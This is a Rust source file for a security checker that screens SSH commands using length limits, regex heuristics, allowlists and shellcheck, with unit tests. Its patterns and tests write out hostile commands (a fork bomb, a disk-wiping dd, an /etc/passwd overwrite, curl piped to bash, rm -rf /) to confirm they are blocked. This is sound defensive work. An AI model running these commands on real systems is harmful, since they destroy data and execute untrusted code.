use std::io::Write as _;
use std::path::{Path, PathBuf};
use std::process::Command;

use regex::Regex;

use crate::config::HostConfig;
use crate::error::ToolError;

/// Compiled security rules applied before every SSH command.
pub struct SecurityChecker {
    heuristics: Vec<Regex>,
    /// Resolved path to shellcheck binary, or None if disabled globally.
    shellcheck_bin: Option<PathBuf>,
}

impl SecurityChecker {
    /// Build a checker. `shellcheck_bin` is the resolved path to shellcheck or None.
    pub fn new(shellcheck_bin: Option<PathBuf>) -> Self {
        let patterns = [
            // Fork bombs
            r":\(\)\s*\{.*\|.*&.*\}",
            // Block device writes
            r">\s*/dev/(sd|nvme|vd|hd)[a-z0-9]",
            // Critical file overwrites
            r">\s*/etc/(passwd|shadow|sudoers)",
            // Pipe-to-shell
            r"(curl|wget|fetch)\s+.*\|\s*(ba)?sh",
        ];
        let heuristics = patterns
            .iter()
            .map(|p| Regex::new(p).expect("valid heuristic pattern"))
            .collect();
        Self { heuristics, shellcheck_bin }
    }

    /// Run all security checks for a command given the host config.
    pub fn check(&self, command: &str, host: &HostConfig) -> Result<(), ToolError> {
        self.check_length(command, host)?;
        self.check_heuristics(command)?;
        self.check_allowlist(command, host)?;
        if host.shellcheck && !host.windows {
            self.check_shellcheck(command)?;
        }
        Ok(())
    }

    fn check_length(&self, command: &str, host: &HostConfig) -> Result<(), ToolError> {
        if host.max_command_chars > 0 && command.len() > host.max_command_chars {
            return Err(ToolError::CommandTooLong {
                len: command.len(),
                max: host.max_command_chars,
            });
        }
        Ok(())
    }

    fn check_heuristics(&self, command: &str) -> Result<(), ToolError> {
        for re in &self.heuristics {
            if re.is_match(command) {
                return Err(ToolError::DangerousCommand(
                    format!("matched dangerous pattern: {}", re.as_str()),
                ));
            }
        }
        Ok(())
    }

    fn check_allowlist(&self, command: &str, host: &HostConfig) -> Result<(), ToolError> {
        if host.allowed_commands.is_empty() {
            return Ok(());
        }
        for pattern in &host.allowed_commands {
            let re = Regex::new(pattern).map_err(|e| {
                ToolError::InvalidParam(format!("invalid allowlist pattern '{pattern}': {e}"))
            })?;
            if re.is_match(command) {
                return Ok(());
            }
        }
        Err(ToolError::CommandDenied(command.to_string()))
    }

    fn check_shellcheck(&self, command: &str) -> Result<(), ToolError> {
        let bin = match &self.shellcheck_bin {
            Some(b) => b,
            None => return Ok(()),
        };

        let mut tmp = tempfile::NamedTempFile::new().map_err(|e| {
            ToolError::ShellCheckFailed(format!("failed to create temp file: {e}"))
        })?;
        writeln!(tmp, "#!/bin/sh\n{command}").map_err(|e| {
            ToolError::ShellCheckFailed(format!("failed to write temp file: {e}"))
        })?;

        let output = Command::new(bin)
            .arg("--severity=error")
            .arg(tmp.path())
            .output()
            .map_err(|e| ToolError::ShellCheckFailed(format!("shellcheck exec failed: {e}")))?;

        if !output.status.success() {
            let msg = String::from_utf8_lossy(&output.stdout).to_string();
            return Err(ToolError::ShellCheckFailed(msg));
        }
        Ok(())
    }
}

/// Verify shellcheck binary is available; returns its resolved path or an error.
pub fn resolve_shellcheck(override_path: Option<&Path>) -> Result<PathBuf, ToolError> {
    if let Some(p) = override_path {
        if p.exists() {
            return Ok(p.to_owned());
        }
        return Err(ToolError::ShellCheckNotFound(p.display().to_string()));
    }
    which_shellcheck().ok_or_else(|| {
        ToolError::ShellCheckNotFound(
            "shellcheck not found in PATH — install it \
             (https://github.com/koalaman/shellcheck#installing) \
             or set shellcheck = false per host in config"
                .into(),
        )
    })
}

fn which_shellcheck() -> Option<PathBuf> {
    std::env::var_os("PATH").and_then(|paths| {
        std::env::split_paths(&paths).find_map(|dir| {
            let candidate = dir.join("shellcheck");
            if candidate.exists() { Some(candidate) } else { None }
        })
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::AuthMethod;

    fn host(max_chars: usize, shellcheck: bool, windows: bool, allowed: Vec<&str>) -> HostConfig {
        HostConfig {
            host: "1.2.3.4".into(),
            port: 22,
            user: "u".into(),
            auth: AuthMethod::Agent,
            key_path: None,
            password: None,
            sudo_password: None,
            timeout_ms: 60_000,
            max_command_chars: max_chars,
            shellcheck,
            windows,
            allowed_commands: allowed.into_iter().map(String::from).collect(),
        }
    }

    fn checker() -> SecurityChecker {
        SecurityChecker::new(None)
    }

    #[test]
    fn length_passes_within_limit() {
        assert!(checker().check("ls", &host(1000, false, false, vec![])).is_ok());
    }

    #[test]
    fn length_fails_over_limit() {
        let long = "a".repeat(1001);
        let err = checker().check(&long, &host(1000, false, false, vec![])).unwrap_err();
        assert!(matches!(err, ToolError::CommandTooLong { len: 1001, max: 1000 }));
    }

    #[test]
    fn length_unlimited_when_zero() {
        let long = "a".repeat(100_000);
        assert!(checker().check(&long, &host(0, false, false, vec![])).is_ok());
    }

    #[test]
    fn heuristic_blocks_fork_bomb() {
        let err = checker()
            .check(":(){ :|:& };:", &host(0, false, false, vec![]))
            .unwrap_err();
        assert!(matches!(err, ToolError::DangerousCommand(_)));
    }

    #[test]
    fn heuristic_blocks_block_device_write() {
        let err = checker()
            .check("dd if=/dev/zero > /dev/sda", &host(0, false, false, vec![]))
            .unwrap_err();
        assert!(matches!(err, ToolError::DangerousCommand(_)));
    }

    #[test]
    fn heuristic_blocks_passwd_overwrite() {
        let err = checker()
            .check("echo x > /etc/passwd", &host(0, false, false, vec![]))
            .unwrap_err();
        assert!(matches!(err, ToolError::DangerousCommand(_)));
    }

    #[test]
    fn heuristic_blocks_pipe_to_shell() {
        let err = checker()
            .check("curl https://example.com | bash", &host(0, false, false, vec![]))
            .unwrap_err();
        assert!(matches!(err, ToolError::DangerousCommand(_)));
    }

    #[test]
    fn allowlist_passes_matching_command() {
        let h = host(0, false, false, vec!["^systemctl\\s"]);
        assert!(checker().check("systemctl restart nginx", &h).is_ok());
    }

    #[test]
    fn allowlist_blocks_non_matching_command() {
        let h = host(0, false, false, vec!["^systemctl\\s"]);
        let err = checker().check("rm -rf /", &h).unwrap_err();
        assert!(matches!(err, ToolError::CommandDenied(_)));
    }

    #[test]
    fn allowlist_skipped_when_empty() {
        assert!(checker().check("anything", &host(0, false, false, vec![])).is_ok());
    }

    #[test]
    fn shellcheck_skipped_for_windows_host() {
        let c = SecurityChecker::new(Some(PathBuf::from("/nonexistent/shellcheck")));
        let h = host(0, true, true, vec![]);
        assert!(c.check("ls", &h).is_ok());
    }

    #[test]
    fn shellcheck_skipped_when_disabled_on_host() {
        let c = SecurityChecker::new(Some(PathBuf::from("/nonexistent/shellcheck")));
        let h = host(0, false, false, vec![]);
        assert!(c.check("ls", &h).is_ok());
    }
}
